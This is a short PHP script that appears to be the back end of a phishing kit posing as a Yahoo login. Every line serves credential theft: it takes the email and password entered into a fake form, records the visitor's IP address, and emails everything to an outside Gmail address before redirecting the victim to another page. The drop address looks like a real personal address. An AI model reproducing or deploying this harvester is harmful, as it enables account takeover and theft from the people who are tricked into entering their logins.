<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || Yahoo Tare_ama || :------\n";
$message .= "email: ".$_POST['formtext1']."\n";
$message .= "Password: ".$_POST['formtext2']."\n";
$message .= "----: || THANKS || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="mariefinnegan1101@gmail.com";
$subject = "tare_ama | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: page55.html");
?>